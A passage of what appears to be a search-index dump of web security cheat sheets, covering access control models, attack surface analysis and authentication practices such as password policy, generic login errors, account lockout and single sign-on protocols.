DAC framework can provide web application security administrators with the ability to implement fine-grained access control. This model can be a basis for data-based access control implementation The advantages of using this model are: Easy to use Easy to administer Aligns to the principle of least privileges. Object owner has total control over access granted Problems that can be encountered while using this methodology: Documentation of the roles and accesses has to be maintained stringently. Multi-tenancy can not be implemented effectively unless there is a way to associate the roles with multi-tenancy capability requirements, e.g. OU in Active Directory There is a tendency for scope creep to happen, e.g. more accesses and privileges can be given than intended for. The areas of caution while using DAC are: While granting trusts Assurance for DAC must be carried out using strict access control reviews.","title":"Discretionary Access Control (DAC)"},{"location":"cheatsheets/Access_Control_Cheat_Sheet.html#mandatory-access-control-mac","text":"Mandatory Access Control (MAC) ensures that the enforcement of organizational security policy does not rely on voluntary web application user compliance. MAC secures information by assigning sensitivity labels on information and comparing this to the level of sensitivity a user is operating at. MAC is usually appropriate for extremely secure systems, including multilevel secure military applications or mission-critical data applications. The advantages of using this methodology are: Access to an object is based on the sensitivity of the object Access based on the need to know is strictly adhered to, and scope creep has minimal possibility Only an administrator can grant access Problems that can be encountered while using this methodology: Difficult and expensive to implement Not agile The areas of caution while using MAC are: Classification and sensitivity assignment at an appropriate and pragmatic level Assurance for MAC must be carried out to ensure that the classification of the objects is at the appropriate level.","title":"Mandatory Access Control (MAC)"},{"location":"cheatsheets/Access_Control_Cheat_Sheet.html#permission-based-access-control","text":"The key concept in Permission Based Access Control is the abstraction of application actions into a set of permissions . A permission may be represented simply as a string-based name, for example, \"READ\". Access decisions are made by checking if the current user has the permission associated with the requested application action. The has relationship between the user and permission may be satisfied by creating a direct relationship between the user and permission (called a grant ), or an indirect one. In the indirect model, the permission grant is to an intermediate entity such as user group . A user is considered a member of a user group if and only if the user inherits permissions from the user group . The indirect model makes it easier to manage the permissions for a large number of users since changing the permissions assigned to the user group affects all members of the user group. In some Permission Based Access Control systems that provide fine-grained domain object-level access control, permissions may be grouped into classes . In this model, it is assumed that each domain object in the system can be associated with a class which determines the permissions applicable to the respective domain object. In such a system a \"DOCUMENT\" class may be defined with the permissions \"READ\", \"WRITE\" and DELETE\"; a \"SERVER\" class may be defined with the permissions \"START\", \"STOP\", and \"REBOOT\".","title":"Permission Based Access Control"},{"location":"cheatsheets/Attack_Surface_Analysis_Cheat_Sheet.html","text":"Attack Surface Analysis Cheat Sheet \u00b6 What is Attack Surface Analysis and Why is it Important \u00b6 This article describes a simple and pragmatic way of doing Attack Surface Analysis and managing an application's Attack Surface. It is targeted to be used by developers to understand and manage application security risks as they design and change an application, as well as by application security specialists doing a security risk assessment. The focus here is on protecting an application from external attack - it does not take into account attacks on the users or operators of the system (e.g. malware injection, social engineering attacks), and there is less focus on insider threats, although the principles remain the same. The internal attack surface is likely to be different to the external attack surface and some users may have a lot of access. Attack Surface Analysis is about mapping out what parts of a system need to be reviewed and tested for security vulnerabilities. The point of Attack Surface Analysis is to understand the risk areas in an application, to make developers and security specialists aware of what parts of the application are open to attack, to find ways of minimizing this, and to notice when and how the Attack Surface changes and what this means from a risk perspective. Attack Surface Analysis is usually done by security architects and pen testers. But developers should understand and monitor the Attack Surface as they design and build and change a system. Attack Surface Analysis helps you to: identify what functions and what parts of the system you need to review/test for security vulnerabilities identify high risk areas of code that require defense-in-depth protection - what parts of the system that you need to defend identify when you have changed the attack surface and need to do some kind of threat assessment Defining the Attack Surface of an Application \u00b6 The Attack Surface describes all of the different points where an attacker could get into a system, and where they could get data out. The Attack Surface of an application is: the sum of all paths for data/commands into and out of the application, and the code that protects these paths (including resource connection and authentication, authorization, activity logging, data validation and encoding) all valuable data used in the application, including secrets and keys, intellectual property, critical business data, personal data and PII, and the code that protects these data (including encryption and checksums, access auditing, and data integrity and operational security controls). You overlay this model with the different types of users - roles, privilege levels - that can access the system (whether authorized or not). Complexity increases with the number of different types of users. But it is important to focus especially on the two extremes: unauthenticated, anonymous users and highly privileged admin users (e.g. database administrators, system administrators). Group each type of attack point into buckets based on risk (external-facing or internal-facing), purpose, implementation, design and technology. You can then count the number of attack points of each type, then choose some cases for each type, and focus your review/assessment on those cases. With this approach, you don't need to understand every endpoint in order to understand the Attack Surface and the potential risk profile of a system. Instead, you can count the different general type of endpoints and the number of points of each type. With this you can budget what it will take to assess risk at scale, and you can tell when the risk profile of an application has significantly changed. Identifying and Mapping the Attack Surface \u00b6 You can start building a baseline description of the Attack Surface in a picture and notes. Spend a few hours reviewing design and architecture documents from an attacker's perspective. Read through the source code and identify different points of entry/exit: User interface (UI) forms and fields HTTP headers and cookies APIs Files Databases Other local storage Email or other kinds of messages Runtime arguments ...Your points of entry/exit The total number of different attack points can easily add up into the thousands or more. To make this manageable, break the model into different types based on function, design and technology: Login/authentication entry points Admin interfaces Inquiries and search functions Data entry (CRUD) forms Business workflows Transactional interfaces/APIs Operational command and monitoring interfaces/APIs Interfaces with other applications/systems ...Your types You also need to identify the valuable data (e.g. confidential, sensitive, regulated) in the application, by interviewing developers and users of the system, and again by reviewing the source code. You can also build up a picture of the Attack Surface by scanning the application. For web apps you can use a tool like the OWASP ZAP or Arachni or Skipfish or w3af or one of the many commercial dynamic testing and vulnerability scanning tools or services to crawl your app and map the parts of the application that are accessible over the web. Some web application firewalls (WAFs) may also be able to export a model of the application's entry points. Validate and fill in your understanding of the Attack Surface by walking through some of the main use cases in the system: signing up and creating a user profile, logging in, searching for an item, placing an order, changing an order, and so on. Follow the flow of control and data through the system, see how information is validated and where it is stored, what resources are touched and what other systems are involved. There is a recursive relationship between Attack Surface Analysis and Application Threat Modeling : changes to the Attack Surface should trigger threat modeling, and threat modeling helps you to understand the Attack Surface of the application. The Attack Surface model may be rough and incomplete to start, especially if you haven't done any security work on the application before. Fill in the holes as you dig deeper in a security analysis, or as you work more with the application and realize that your understanding of the Attack Surface has improved. Measuring and Assessing the Attack Surface \u00b6 Once you have a map of the Attack Surface, identify the high risk areas. Focus on remote entry points \u2013 interfaces with outside systems and to the Internet \u2013 and especially where the system allows anonymous, public access. Network-facing, especially internet-facing code Web forms Files from outside of the network Backward compatible interfaces with other systems \u2013 old protocols, sometimes old code and libraries, hard to maintain and test multiple versions Custom APIs \u2013 protocols etc \u2013 likely to have mistakes in design and implementation Security code: anything to do with cryptography, authentication, authorization (access control) and session management These are often where you are most exposed to attack. Then understand what compensating controls you have in place, operational controls like network firewalls and application firewalls, and intrusion detection or prevention systems to help protect your application. Michael Howard at Microsoft and other researchers have developed a method for measuring the Attack Surface of an application, and to track changes to the Attack Surface over time, called the Relative Attack Surface Quotient (RSQ) . Using this method you calculate an overall attack surface score for the system, and measure this score as changes are made to the system and to how it is deployed. Researchers at Carnegie Mellon built on this work to develop a formal way to calculate an Attack Surface Metric for large systems like SAP. They calculate the Attack Surface as the sum of all entry and exit points, channels (the different ways that clients or external systems connect to the system, including TCP/UDP ports, RPC end points, named pipes...) and untrusted data elements. Then they apply a damage potential/effort ratio to these Attack Surface elements to identify high-risk areas. Note that deploying multiple versions of an application, leaving features in that are no longer used just in case they may be needed in the future, or leaving old backup copies and unused code increases the Attack Surface. Source code control and robust change management/configurations practices should be used to ensure the actual deployed Attack Surface matches the theoretical one as closely as possible. Backups of code and data - online, and on offline media - are an important but often ignored part of a system's Attack Surface. Protecting your data and IP by writing secure software and hardening the infrastructure will all be wasted if you hand everything over to bad guys by not protecting your backups. Managing the Attack Surface \u00b6 Once you have a baseline understanding of the Attack Surface, you can use it to incrementally identify and manage risks going forward as you make changes to the application. Ask yourself: What has changed? What are you doing different? (technology, new approach, \u2026.) What holes could you have opened? The first web page that you create opens up the system's Attack Surface significantly and introduces all kinds of new risks. If you add another field to that page, or another web page like it, while technically you have made the Attack Surface bigger, you haven't increased the risk profile of the application in a meaningful way. Each of these incremental changes is more of the same, unless you follow a new design or use a new framework. If you add another web page that follows the same design and using the same technology as existing web pages, it's easy to understand how much security testing and review it needs. If you add a new web services API or file that can be uploaded from the Internet, each of these changes have a different risk profile again - see if if the change fits in an existing bucket, see if the existing controls and protections apply. If you're adding something that doesn't fall into an existing bucket, this means that you have to go through a more thorough risk assessment to understand what kind of security holes you may open and what protections you need to put in place. Changes to session management, authentication and password management directly affect the Attack Surface and need to be reviewed. So do changes to authorization and access control logic, especially adding or changing role definitions, adding admin users or admin functions with high privileges. Similarly for changes to the code that handles encryption and secrets. Fundamental changes to how data validation is done. And major architectural changes to layering and trust relationships, or fundamental changes in technical architecture \u2013 swapping out your web server or database platform, or changing the runtime operating system. As you add new user types or roles or privilege levels, you do the same kind of analysis and risk assessment. Overlay the type of access across the data and functions and look for problems and inconsistencies. It's important to understand the access model for the application, whether it is positive (access is deny by default) or negative (access is allow by default). In a positive access model, any mistakes in defining what data or functions are permitted to a new user type or role are easy to see. In a negative access model, you have to be much more careful to ensure that a user does not get access to data/functions that they should not be permitted to. This kind of threat or risk assessment can be done periodically, or as a part of design work in serial / phased / spiral / waterfall development projects, or continuously and incrementally in Agile / iterative development. Normally, an application's Attack Surface will increase over time as you add more interfaces and user types and integrate with other systems. You also want to look for ways to reduce the size of the Attack Surface when you can by simplifying the model (reducing the number of user levels for example or not storing confidential data that you don't absolutely have to), turning off features and interfaces that aren't being used, by introducing operational controls such as a Web Application Firewall (WAF) and real-time application-specific attack detection.","title":"Attack Surface Analysis"},{"location":"cheatsheets/Attack_Surface_Analysis_Cheat_Sheet.html#attack-surface-analysis-cheat-sheet","text":"","title":"Attack Surface Analysis Cheat Sheet"},{"location":"cheatsheets/Attack_Surface_Analysis_Cheat_Sheet.html#what-is-attack-surface-analysis-and-why-is-it-important","text":"This article describes a simple and pragmatic way of doing Attack Surface Analysis and managing an application's Attack Surface. It is targeted to be used by developers to understand and manage application security risks as they design and change an application, as well as by application security specialists doing a security risk assessment. The focus here is on protecting an application from external attack - it does not take into account attacks on the users or operators of the system (e.g. malware injection, social engineering attacks), and there is less focus on insider threats, although the principles remain the same. The internal attack surface is likely to be different to the external attack surface and some users may have a lot of access. Attack Surface Analysis is about mapping out what parts of a system need to be reviewed and tested for security vulnerabilities. The point of Attack Surface Analysis is to understand the risk areas in an application, to make developers and security specialists aware of what parts of the application are open to attack, to find ways of minimizing this, and to notice when and how the Attack Surface changes and what this means from a risk perspective. Attack Surface Analysis is usually done by security architects and pen testers. But developers should understand and monitor the Attack Surface as they design and build and change a system. Attack Surface Analysis helps you to: identify what functions and what parts of the system you need to review/test for security vulnerabilities identify high risk areas of code that require defense-in-depth protection - what parts of the system that you need to defend identify when you have changed the attack surface and need to do some kind of threat assessment","title":"What is Attack Surface Analysis and Why is it Important"},{"location":"cheatsheets/Attack_Surface_Analysis_Cheat_Sheet.html#defining-the-attack-surface-of-an-application","text":"The Attack Surface describes all of the different points where an attacker could get into a system, and where they could get data out. The Attack Surface of an application is: the sum of all paths for data/commands into and out of the application, and the code that protects these paths (including resource connection and authentication, authorization, activity logging, data validation and encoding) all valuable data used in the application, including secrets and keys, intellectual property, critical business data, personal data and PII, and the code that protects these data (including encryption and checksums, access auditing, and data integrity and operational security controls). You overlay this model with the different types of users - roles, privilege levels - that can access the system (whether authorized or not). Complexity increases with the number of different types of users. But it is important to focus especially on the two extremes: unauthenticated, anonymous users and highly privileged admin users (e.g. database administrators, system administrators). Group each type of attack point into buckets based on risk (external-facing or internal-facing), purpose, implementation, design and technology. You can then count the number of attack points of each type, then choose some cases for each type, and focus your review/assessment on those cases. With this approach, you don't need to understand every endpoint in order to understand the Attack Surface and the potential risk profile of a system. Instead, you can count the different general type of endpoints and the number of points of each type. With this you can budget what it will take to assess risk at scale, and you can tell when the risk profile of an application has significantly changed.","title":"Defining the Attack Surface of an Application"},{"location":"cheatsheets/Attack_Surface_Analysis_Cheat_Sheet.html#identifying-and-mapping-the-attack-surface","text":"You can start building a baseline description of the Attack Surface in a picture and notes. Spend a few hours reviewing design and architecture documents from an attacker's perspective. Read through the source code and identify different points of entry/exit: User interface (UI) forms and fields HTTP headers and cookies APIs Files Databases Other local storage Email or other kinds of messages Runtime arguments ...Your points of entry/exit The total number of different attack points can easily add up into the thousands or more. To make this manageable, break the model into different types based on function, design and technology: Login/authentication entry points Admin interfaces Inquiries and search functions Data entry (CRUD) forms Business workflows Transactional interfaces/APIs Operational command and monitoring interfaces/APIs Interfaces with other applications/systems ...Your types You also need to identify the valuable data (e.g. confidential, sensitive, regulated) in the application, by interviewing developers and users of the system, and again by reviewing the source code. You can also build up a picture of the Attack Surface by scanning the application. For web apps you can use a tool like the OWASP ZAP or Arachni or Skipfish or w3af or one of the many commercial dynamic testing and vulnerability scanning tools or services to crawl your app and map the parts of the application that are accessible over the web. Some web application firewalls (WAFs) may also be able to export a model of the application's entry points. Validate and fill in your understanding of the Attack Surface by walking through some of the main use cases in the system: signing up and creating a user profile, logging in, searching for an item, placing an order, changing an order, and so on. Follow the flow of control and data through the system, see how information is validated and where it is stored, what resources are touched and what other systems are involved. There is a recursive relationship between Attack Surface Analysis and Application Threat Modeling : changes to the Attack Surface should trigger threat modeling, and threat modeling helps you to understand the Attack Surface of the application. The Attack Surface model may be rough and incomplete to start, especially if you haven't done any security work on the application before. Fill in the holes as you dig deeper in a security analysis, or as you work more with the application and realize that your understanding of the Attack Surface has improved.","title":"Identifying and Mapping the Attack Surface"},{"location":"cheatsheets/Attack_Surface_Analysis_Cheat_Sheet.html#measuring-and-assessing-the-attack-surface","text":"Once you have a map of the Attack Surface, identify the high risk areas. Focus on remote entry points \u2013 interfaces with outside systems and to the Internet \u2013 and especially where the system allows anonymous, public access. Network-facing, especially internet-facing code Web forms Files from outside of the network Backward compatible interfaces with other systems \u2013 old protocols, sometimes old code and libraries, hard to maintain and test multiple versions Custom APIs \u2013 protocols etc \u2013 likely to have mistakes in design and implementation Security code: anything to do with cryptography, authentication, authorization (access control) and session management These are often where you are most exposed to attack. Then understand what compensating controls you have in place, operational controls like network firewalls and application firewalls, and intrusion detection or prevention systems to help protect your application. Michael Howard at Microsoft and other researchers have developed a method for measuring the Attack Surface of an application, and to track changes to the Attack Surface over time, called the Relative Attack Surface Quotient (RSQ) . Using this method you calculate an overall attack surface score for the system, and measure this score as changes are made to the system and to how it is deployed. Researchers at Carnegie Mellon built on this work to develop a formal way to calculate an Attack Surface Metric for large systems like SAP. They calculate the Attack Surface as the sum of all entry and exit points, channels (the different ways that clients or external systems connect to the system, including TCP/UDP ports, RPC end points, named pipes...) and untrusted data elements. Then they apply a damage potential/effort ratio to these Attack Surface elements to identify high-risk areas. Note that deploying multiple versions of an application, leaving features in that are no longer used just in case they may be needed in the future, or leaving old backup copies and unused code increases the Attack Surface. Source code control and robust change management/configurations practices should be used to ensure the actual deployed Attack Surface matches the theoretical one as closely as possible. Backups of code and data - online, and on offline media - are an important but often ignored part of a system's Attack Surface. Protecting your data and IP by writing secure software and hardening the infrastructure will all be wasted if you hand everything over to bad guys by not protecting your backups.","title":"Measuring and Assessing the Attack Surface"},{"location":"cheatsheets/Attack_Surface_Analysis_Cheat_Sheet.html#managing-the-attack-surface","text":"Once you have a baseline understanding of the Attack Surface, you can use it to incrementally identify and manage risks going forward as you make changes to the application. Ask yourself: What has changed? What are you doing different? (technology, new approach, \u2026.) What holes could you have opened? The first web page that you create opens up the system's Attack Surface significantly and introduces all kinds of new risks. If you add another field to that page, or another web page like it, while technically you have made the Attack Surface bigger, you haven't increased the risk profile of the application in a meaningful way. Each of these incremental changes is more of the same, unless you follow a new design or use a new framework. If you add another web page that follows the same design and using the same technology as existing web pages, it's easy to understand how much security testing and review it needs. If you add a new web services API or file that can be uploaded from the Internet, each of these changes have a different risk profile again - see if if the change fits in an existing bucket, see if the existing controls and protections apply. If you're adding something that doesn't fall into an existing bucket, this means that you have to go through a more thorough risk assessment to understand what kind of security holes you may open and what protections you need to put in place. Changes to session management, authentication and password management directly affect the Attack Surface and need to be reviewed. So do changes to authorization and access control logic, especially adding or changing role definitions, adding admin users or admin functions with high privileges. Similarly for changes to the code that handles encryption and secrets. Fundamental changes to how data validation is done. And major architectural changes to layering and trust relationships, or fundamental changes in technical architecture \u2013 swapping out your web server or database platform, or changing the runtime operating system. As you add new user types or roles or privilege levels, you do the same kind of analysis and risk assessment. Overlay the type of access across the data and functions and look for problems and inconsistencies. It's important to understand the access model for the application, whether it is positive (access is deny by default) or negative (access is allow by default). In a positive access model, any mistakes in defining what data or functions are permitted to a new user type or role are easy to see. In a negative access model, you have to be much more careful to ensure that a user does not get access to data/functions that they should not be permitted to. This kind of threat or risk assessment can be done periodically, or as a part of design work in serial / phased / spiral / waterfall development projects, or continuously and incrementally in Agile / iterative development. Normally, an application's Attack Surface will increase over time as you add more interfaces and user types and integrate with other systems. You also want to look for ways to reduce the size of the Attack Surface when you can by simplifying the model (reducing the number of user levels for example or not storing confidential data that you don't absolutely have to), turning off features and interfaces that aren't being used, by introducing operational controls such as a Web Application Firewall (WAF) and real-time application-specific attack detection.","title":"Managing the Attack Surface"},{"location":"cheatsheets/Authentication_Cheat_Sheet.html","text":"Authentication Cheat Sheet \u00b6 Introduction \u00b6 Authentication is the process of verifying that an individual, entity or website is whom it claims to be. Authentication in the context of web applications is commonly performed by submitting a username or ID and one or more items of private information that only a given user should know. Session Management is a process by which a server maintains the state of an entity interacting with it. This is required for a server to remember how to react to subsequent requests throughout a transaction. Sessions are maintained on the server by a session identifier which can be passed back and forward between the client and server when transmitting and receiving requests. Sessions should be unique per user and computationally very difficult to predict. The Session Management Cheat Sheet contains further guidance on the best practices in this area. Authentication General Guidelines \u00b6 User IDs \u00b6 Make sure your usernames/user IDs are case-insensitive. User 'smith' and user 'Smith' should be the same user. Usernames should also be unique. For high-security applications, usernames could be assigned and secret instead of user-defined public data. Email address as a User ID \u00b6 For information on validating email addresses, please visit the input validation cheatsheet email discussion . Authentication Solution and Sensitive Accounts \u00b6 Do NOT allow login with sensitive accounts (i.e. accounts that can be used internally within the solution such as to a back-end / middle-ware / DB) to any front-end user-interface Do NOT use the same authentication solution (e.g. IDP / AD) used internally for unsecured access (e.g. public access / DMZ) Implement Proper Password Strength Controls \u00b6 A key concern when using passwords for authentication is password strength. A \"strong\" password policy makes it difficult or even improbable for one to guess the password through either manual or automated means. The following characteristics define a strong password: Password Length Minimum length of the passwords should be enforced by the application. Passwords shorter than 8 characters are considered to be weak ( NIST SP800-63B ). Maximum password length should not be set too low , as it will prevent users from creating passphrases. A common maximum length is 64 characters due to limitations in certain hashing algorithms, as discussed in the Password Storage Cheat Sheet . It is important to set a maximum password length to prevent long password Denial of Service attacks . Do not silently truncate passwords. The Password Storage Cheat Sheet provides further guidance on how to handle passwords that are longer than the maximum length. Allow usage of all characters including unicode and whitespace. There should be no password composition rules limiting the type of characters permitted. Ensure credential rotation when a password leak, or at the time of compromise identification. Include password strength meter to help users create a more complex password and block common and previously breached passwords zxcvbn library can be used for this purpose. (Note that this library is no longer maintained) Pwned Passwords is a service where passwords can be checked against previously breached passwords. You can host it yourself or use API . For more detailed information check \u00b6 ASVS v4.0 Password Security Requirements Passwords Evolved: Authentication Guidance for the Modern Era Implement Secure Password Recovery Mechanism \u00b6 It is common for an application to have a mechanism that provides a means for a user to gain access to their account in the event they forget their password. Please see Forgot Password Cheat Sheet for details on this feature. Store Passwords in a Secure Fashion \u00b6 It is critical for an application to store a password using the right cryptographic technique. Please see Password Storage Cheat Sheet for details on this feature. Compare Password Hashes Using Safe Functions \u00b6 Where possible, the user-supplied password should be compared to the stored password hash using a secure password comparison function provided by the language or framework, such as the password_verify() function in PHP. Where this is not possible, ensure that the comparison function: Has a maximum input length, to protect against denial of service attacks with very long inputs. Explicitly sets the type of both variable, to protect against type confusion attacks such as Magic Hashes in PHP. Returns in constant time, to protect against timing attacks. Transmit Passwords Only Over TLS or Other Strong Transport \u00b6 See: Transport Layer Protection Cheat Sheet The login page and all subsequent authenticated pages must be exclusively accessed over TLS or other strong transport. The initial login page referred to as the \"login landing page\", must be served over TLS or other strong transport. Failure to utilize TLS or other strong transport for the login landing page allows an attacker to modify the login form action, causing the user's credentials to be posted to an arbitrary location. Failure to utilize TLS or other strong transport for authenticated pages after login enables an attacker to view the unencrypted session ID and compromise the user's authenticated session. Require Re-authentication for Sensitive Features \u00b6 In order to mitigate CSRF and session hijacking, it's important to require the current credentials for an account before updating sensitive account information such as the user's password, user's email, or before sensitive transactions, such as shipping a purchase to a new address. Without this countermeasure, an attacker may be able to execute sensitive transactions through a CSRF or XSS attack without needing to know the user's current credentials. Additionally, an attacker may get temporary physical access to a user's browser or steal their session ID to take over the user's session. Consider Strong Transaction Authentication \u00b6 Some applications should use a second factor to check whether a user may perform sensitive operations. For more information, see the Transaction Authorization Cheat Sheet . TLS Client Authentication \u00b6 TLS Client Authentication, also known as two-way TLS authentication, consists of both, browser and server, sending their respective TLS certificates during the TLS handshake process. Just as you can validate the authenticity of a server by using the certificate and asking a well known Certificate Authority (CA) if the certificate is valid, the server can authenticate the user by receiving a certificate from the client and validating against a third party CA or its own CA. To do this, the server must provide the user with a certificate generated specifically for him, assigning values to the subject so that these can be used to determine what user the certificate should validate. The user installs the certificate on a browser and now uses it for the website. It is a good idea to do this when: It is acceptable (or even preferred) that the user only has access to the website from only a single computer/browser. The user is not easily scared by the process of installing TLS certificates on his browser, or there will be someone, probably from IT support, that will do this for the user. The website requires an extra step of security. It is also a good thing to use when the website is for an intranet of a company or organization. It is generally not a good idea to use this method for widely and publicly available websites that will have an average user. For example, it wouldn't be a good idea to implement this for a website like Facebook. While this technique can prevent the user from having to type a password (thus protecting against an average keylogger from stealing it), it is still considered a good idea to consider using both a password and TLS client authentication combined. Additionally, if the client is behind an enterprise proxy which performs SSL/TLS decryption, this will break certificate authentication unless the site is whitelisted on the proxy. For more information, see: Client-authenticated TLS handshake Authentication and Error Messages \u00b6 Incorrectly implemented error messages in the case of authentication functionality can be used for the purposes of user ID and password enumeration. An application should respond (both HTTP and HTML) in a generic manner. Authentication Responses \u00b6 Using any of the authentication mechanisms (login, password reset or password recovery), an application must respond with a generic error message regardless of whether: The user ID or password was incorrect. The account does not exist. The account is locked or disabled. The account registration feature should also be taken into consideration, and the same approach of generic error message can be applied regarding the case in which the user exists. The objective is to prevent the creation of a discrepancy factor , allowing an attacker to mount a user enumeration action against the application. It is interesting to note that the business logic itself can bring a discrepancy factor related to the processing time taken. Indeed, depending on the implementation, the processing time can be significantly different according to the case (success vs failure) allowing an attacker to mount a time-based attack (delta of some seconds for example). Example using pseudo-code for a login feature: First implementation using the \"quick exit\" approach IF USER_EXISTS(username) THEN password_hash=HASH(password) IS_VALID=LOOKUP_CREDENTIALS_IN_STORE(username, password_hash) IF NOT IS_VALID THEN RETURN Error(\"Invalid Username or Password!\") ENDIF ELSE RETURN Error(\"Invalid Username or Password!\") ENDIF It can be clearly seen that if the user doesn't exist, the application will directly throw an error. Otherwise, when the user exists and the password doesn't, it is apparent that there will be more processing before the application errors out. In return, the response time will be different for the same error, allowing the attacker to differentiate between a wrong username and a wrong password. Second implementation without relying on the \"quick exit\" approach: password_hash=HASH(password) IS_VALID=LOOKUP_CREDENTIALS_IN_STORE(username, password_hash) IF NOT IS_VALID THEN RETURN Error(\"Invalid Username or Password!\") ENDIF This code will go through the same process no matter what the user or the password is, allowing the application to return in approximately the same response time. The problem with returning a generic error message for the user is a User Experience (UX) matter. A legitimate user might feel confused with the generic messages, thus making it hard for them to use the application, and might after several retries, leave the application because of its complexity. The decision to return a generic error message can be determined based on the criticality of the application and its data. For example, for critical applications, the team can decide that under the failure scenario, a user will always be redirected to the support page and a generic error message will be returned. Regarding the user enumeration itself, protection against brute-force attack are also effective because they prevent an attacker from applying the enumeration at scale. Usage of CAPTCHA can be applied on a feature for which a generic error message cannot be returned because the user experience must be preserved. Incorrect and correct response examples \u00b6 Login \u00b6 Incorrect response examples: \"Login for User foo: invalid password.\" \"Login failed, invalid user ID.\" \"Login failed; account disabled.\" \"Login failed; this user is not active.\" Correct response example: \"Login failed; Invalid user ID or password.\" Password recovery \u00b6 Incorrect response examples: \"We just sent you a password reset link.\" \"This email address doesn't exist in our database.\" Correct response example: \"If that email address is in our database, we will send you an email to reset your password.\" Account creation \u00b6 Incorrect response examples: \"This user ID is already in use.\" \"Welcome! You have signed up successfully.\" Correct response example: \"A link to activate your account has been emailed to the address provided.\" Error Codes and URLs \u00b6 The application may return a different HTTP Error code depending on the authentication attempt response. It may respond with a 200 for a positive result and a 403 for a negative result. Even though a generic error page is shown to a user, the HTTP response code may differ which can leak information about whether the account is valid or not. Error disclosure can also be used as a discrepancy factor, consult the error handling cheat sheet regarding the global handling of different errors in an application. Protect Against Automated Attacks \u00b6 There are a number of different types of automated attacks that attackers can use to try and compromise user accounts. The most common types are listed below: Attack Type Description Brute Force Testing multiple passwords from a dictionary or other source against a single account. Credential Stuffing Testing username/password pairs obtained from the breach of another site. Password Spraying Testing a single weak password against a large number of different accounts. Different protection mechanisms can be implemented to protect against these attacks. In many cases, these defences do not provide complete protection, but when a number of them are implemented in a defence-in-depth approach, a reasonable level of protection can be achieved. The following sections will focus primarily on preventing brute-force attacks, although these controls can also be effective against other types of attacks. For further guidance on defending against credential stuffing and password spraying, see the Credential Stuffing Cheat Sheet . Multi-Factor Authentication \u00b6 Multi-factor authentication (MFA) is by far the best defence against the majority of password-related attacks, including brute-force attacks, with analysis by Microsoft suggesting that it would have stopped 99.9% of account compromises . As such, it should be implemented wherever possible; however, depending on the audience of the application, it may not be practical or feasible to enforce the use of MFA. The Multifactor Authentication Cheat Sheet contains further guidance on implementing MFA. Account Lockout \u00b6 The most common protection against these attacks is to implement account lockout, which prevents any more login attempts for a period after a certain number of failed logins. The counter of failed logins should be associated with the account itself, rather than the source IP address, in order to prevent an attacker from making login attempts from a large number of different IP addresses. There are a number of different factors that should be considered when implementing an account lockout policy in order to find a balance between security and usability: The number of failed attempts before the account is locked out (lockout threshold). The time period that these attempts must occur within (observation window). How long the account is locked out for (lockout duration). Rather than implementing a fixed lockout duration (e.g., ten minutes), some applications use an exponential lockout, where the lockout duration starts as a very short period (e.g., one second), but doubles after each failed login attempt. When designing an account lockout system, care must be taken to prevent it from being used to cause a denial of service by locking out other users' accounts. One way this could be performed is to allow the user of the forgotten password functionality to log in, even if the account is locked out. CAPTCHA \u00b6 The use of an effective CAPTCHA can help to prevent automated login attempts against accounts. However, many CAPTCHA implementations have weaknesses that allow them to be solved using automated techniques or can be outsourced to services which can solve them. As such, the use of CAPTCHA should be viewed as a defence-in-depth control to make brute-force attacks more time consuming and expensive, rather than as a preventative. It may be more user-friendly to only require a CAPTCHA be solved after a small number of failed login attempts, rather than requiring it from the very first login. Security Questions and Memorable Words \u00b6 The addition of a security question or memorable word can also help protect against automated attacks, especially when the user is asked to enter a number of randomly chosen characters from the word. It should be noted that this does not constitute multi-factor authentication, as both factors are the same (something you know). Furthermore, security questions are often weak and have predictable answers, so they must be carefully chosen. The Choosing and Using Security Questions cheat sheet contains further guidance on this. Logging and Monitoring \u00b6 Enable logging and monitoring of authentication functions to detect attacks/failures on a real-time basis Ensure that all failures are logged and reviewed Ensure that all password failures are logged and reviewed Ensure that all account lockouts are logged and reviewed Use of authentication protocols that require no password \u00b6 While authentication through a user/password combination and using multi-factor authentication is considered generally secure, there are use cases where it isn't considered the best option or even safe. Examples of this are third party applications that desire connecting to the web application, either from a mobile device, another website, desktop or other situations. When this happens, it is NOT considered safe to allow the third-party application to store the user/password combo, since then it extends the attack surface into their hands, where it isn't in your control. For this, and other use cases, there are several authentication protocols that can protect you from exposing your users' data to attackers. OAuth \u00b6 Open Authorization (OAuth) is a protocol that allows an application to authenticate against a server as a user, without requiring passwords or any third party server that acts as an identity provider. It uses a token generated by the server and provides how the authorization flows most occur, so that a client, such as a mobile application, can tell the server what user is using the service. The recommendation is to use and implement OAuth 1.0a or OAuth 2.0 since the very first version (OAuth1.0) has been found to be vulnerable to session fixation. OAuth 2.0 relies on HTTPS for security and is currently used and implemented by APIs from companies such as Facebook, Google, Twitter and Microsoft. OAuth1.0a is more difficult to use because it requires the use of cryptographic libraries for digital signatures. However, since OAuth1.0a does not rely on HTTPS for security, it can be more suited for higher-risk transactions. OpenId \u00b6 OpenId is an HTTP-based protocol that uses identity providers to validate that a user is whom he says he is. It is a very simple protocol which allows a service provider initiated way for single sign-on (SSO). This allows the user to re-use a single identity given to a trusted OpenId identity provider and be the same user in multiple websites, without the need to provide any website with the password, except for the OpenId identity provider. Due to its simplicity and that it provides protection of passwords, OpenId has been well adopted. Some of the well-known identity providers for OpenId are Stack Exchange, Google, Facebook and Yahoo! For non-enterprise environments, OpenId is considered a secure and often better choice, as long as the identity provider is of trust. SAML \u00b6 Security Assertion Markup Language (SAML) is often considered to compete with OpenId. The most recommended version is 2.0 since it is very features complete and provides strong security. Like OpenId, SAML uses identity providers, but unlike OpenId, it is XML-based and provides more flexibility. SAML is based on browser redirects which send XML data. Furthermore, SAML isn't only initiated by a service provider; it can also be initiated from the identity provider. This allows the user to navigate through different portals while still being authenticated without having to do anything, making the process transparent. While OpenId has taken most of the consumer market, SAML is often the choice for enterprise applications. The reason for this is often that there are few OpenId identity providers which are considered of enterprise-class (meaning that the way they validate the user identity doesn't have high standards required for enterprise identity). It is more common to see SAML being used inside of intranet websites, sometimes even using a server from the intranet as the identity provider. In the past few years, applications like SAP ERP and SharePoint (SharePoint by using Active Directory Federation Services 2.0) have decided to use SAML 2.0 authentication as an often preferred method for single sign-on implementations whenever enterprise federation is required for web services and web applications. See also: SAML Security Cheat Sheet FIDO \u00b6 The Fast Identity Online (FIDO) Alliance has created two protocols to facilitate online authentication: the Universal Authentication Framework (UAF) protocol and the Universal Second Factor (U2F) protocol. While UAF focuses on passwordless authentication, U2F allows the addition of a second factor to existing password-based authentication. Both protocols are based on a public key cryptography challenge-response model. UAF takes advantage of existing security technologies present on devices for authentication including fingerprint sensors, cameras(face biometrics), 